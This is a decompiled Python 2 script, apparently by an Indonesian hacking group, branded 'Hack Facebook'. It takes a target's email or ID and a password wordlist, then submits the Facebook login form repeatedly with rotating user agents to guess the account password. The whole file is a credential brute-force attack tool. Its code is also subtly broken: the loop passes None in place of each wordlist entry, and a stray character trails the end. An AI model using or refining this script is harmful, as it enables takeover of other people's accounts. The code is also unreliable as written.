
# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Auto Dis Parser 2.2.0
# Source File : brute_one.pyc
# Bytecode Version : 2.7
# Time : Sun Aug  9 12:16:53 2020
#---------------------------------------

import os
import sys
import time
import random
import cookielib
import mechanize
wd = '\x1b[90;1m'
GL = '\x1b[96;1m'
BB = '\x1b[34;1m'
YY = '\x1b[33;1m'
GG = '\x1b[32;1m'
WW = '\x1b[0;1m'
RR = '\x1b[31;1m'
CC = '\x1b[36;1m'
B = '\x1b[34m'
Y = '\x1b[33;1m'
G = '\x1b[32m'
W = '\x1b[0;1m'
R = '\x1b[31m'
C = '\x1b[36;1m'

def runntxt(s):
    for noobs in s + '\n':
        sys.stdout.write(noobs)
        sys.stdout.flush()
        time.sleep(10 / 2100)
    


def banner():
    os.system('clear')
    print ' '
    runntxt(GL + '              \xf0\x9f\x94\xb0 WELCOME \xf0\x9f\x94\xb0')
    time.sleep(1.5)
    runntxt(G + '  Baca Bismillah Dulu Agar Terhindar\n     Dari Perbuatan Kejahatan\n       ' + Y + 'Bismillahirohmanirohim\n')
    time.sleep(5)
    print G + '[RG.4]Black_Coder Team' + Y + '<<<' + GL + '\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print R + 'Remaja berkarya            \xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92' + GL + '\xe2\x95\x91'
    print R + 'Bukan Bergaya     ' + Y + 'Facebook ' + R + '\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92' + GL + '\xe2\x95\x91'
    print W + 'Author : Tegar ID          \xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92' + GL + '\xe2\x95\x91'
    print W + 'Kontak : 08212506xxxx      \xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92' + GL + '\xe2\x95\x91'
    print Y + 'Github : Https://github.com/Tegar-ID     ' + GL + '\xe2\x95\x91'
    print '\xe2\x95\x91' + B + '-\xe2\x96\xba ' + R + '{' + W + '01' + R + '}' + W + './P3R50N G4N5           ' + GL + '\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print '\xe2\x95\x91' + B + '-\xe2\x96\xba ' + R + '{' + W + '02' + R + '}' + W + 'Mr XHamster         ' + GL + '\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\xe2\x95\x91' + B + '-\xe2\x96\xba ' + R + '{' + W + '03' + R + '}' + W + 'MeYouSue            ' + GL + '\xe2\x95\x91 ' + R + 'Tegar ' + GL + '\xe2\x95\x91]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\xe2\x95\x91' + B + '-\xe2\x96\xba ' + R + '{' + W + '04' + R + '}' + W + 'Lucky Know          ' + GL + '\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d    \xe2\x95\x91'
    print '\xe2\x95\x91' + B + '-\xe2\x96\xba ' + R + '{' + W + '05' + R + '}' + W + 'XGanz                            ' + GL + '\xe2\x95\x91'
    print '\xe2\x95\x91' + B + '-\xe2\x96\xba ' + R + '{' + W + '06' + R + '}' + W + 'Mr.Cekliz                        ' + GL + '\xe2\x95\x91'
    print '\xe2\x95\x91' + B + '-\xe2\x96\xba ' + R + '{' + W + '07' + R + '}' + W + 'Bidadari Viee                    ' + GL + '\xe2\x95\x91'
    print '\xe2\x95\x91' + B + '-\xe2\x96\xba ' + R + '{' + W + '08' + R + '}' + W + 'Rice                             ' + GL + '\xe2\x95\x91'
    print '\xe2\x95\x91' + B + '-\xe2\x96\xba ' + R + '{' + W + '09' + R + '}' + W + './Nahrun Ganz                    ' + GL + '\xe2\x95\x91'
    print '\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[' + R + 'Hack Facebook' + GL + ']\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print ' '

banner()
email_target = str(raw_input(GL + '\x1b[92mMasukkan Email/Id Target =>\x1b[93m  '))
password_list = str(raw_input(GG + 'Ketik pass.txt =>\x1b[93m '))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [
    ('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]

def pil():
    print GG + ' '
    g = str(raw_input('[?] Coba Lagi ?\x1b[93;1m[y/n]: '))
    if g == 'y' or g == 'Y':
        os.system('python2 force.py')
    elif g == 'n' or g == 'N':
        print wd + 'Keluar dari program...'
        sys.exit()
    else:
        print RR + 'Pilih yang bener cuk...'
        pil()


def edit_wordlist():
    print GG + ' '
    ed = str(raw_input('[?] Edit wordlist bos? \x1b[96;1m[y/n]: '))
    if ed == 'y' or ed == 'Y':
        os.system('nano ' + password_list)
        pil()
    elif ed == 'n' or ed == 'N':
        print wd + 'Keluar Dari Program...'
        sys.exit()
    else:
        print RR + 'Pilih yg bener...'
        edit_wordlist()


def main():
    global noobs
    noobs = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    noobs.set_handle_robots(False)
    noobs.set_handle_redirect(True)
    noobs.set_cookiejar(cj)
    noobs.set_handle_equiv(True)
    noobs.set_handle_referer(True)
    noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
    runn_noobs()
    life()
    print ' '
    print RR + ' wordlist tidak ada yg cocok...'
    print ' '


def BLANK(hack_password):
    
    try:
        sys.stdout.write(GG + '\n[\x1b[91m+\x1b[92m]\x1b[91;1m [\x1b[97m' + email_target + '\x1b[91m]\x1b[90m Mencoba Password ==> \x1b[91m[\x1b[90;1m' + hack_password)
        sys.stdout.flush()
        noobs.addheaders = [
            ('User-agent', random.choice(useragents))]
        site = noobs.open(login)
        noobs.select_form(nr = 0)
        noobs.form['email'] = email_target
        noobs.form['pass'] = hack_password
        tom = noobs.submit()
        mask = tom.geturl()
        if mask != login and 'login_attempt' not in mask:
            print ' '
            print '\x1b[96m                S U C C E S S'
            print '          P A S S W O R D  F I N D '
            print RR + '+-------------------------------------------+'
            print (RR + '#\x1b[97m ID / Email Target:\x1b[92m {}').format(email_target)
            print (RR + '#\x1b[97m Password Target:\x1b[92m {}').format(hack_password)
            print ' '
            raw_input(WW + 'TEKAN ENTER UNTUK KELUAR...')
            sys.exit(1)
    except KeyboardInterrupt:
        print wd + 'Stop.......'
        edit_wordlist()
        sys.exit()



def life():
    global hack_password
    password_nob = open(password_list, 'r')
    for password_nob in password_nob:
        hack_password = None
        BLANK(hack_password)
    


def runn_noobs():
    lop = GG + '\n             \x1b[90;1m[RG4]Black_Coder\x1b[91;1m\n             Creator by:\x1b[97m Tegar ID\n      '
    print lop
    nuub = open(password_list, 'r')
    nuub = nuub.readlines()
    print wd + ' [#] ID / Username Target\x1b[97;1m: {}'.format(email_target)
    print wd + ' [#] Jumlah Wordlist Saat Ini\x1b[97;1m:', len(nuub), 'password'
    print wd + ' [#] Tunggu Proses Cracking\x1b[97;1m..........'
    print ' '

if __name__ == '__main__':
    main()
l
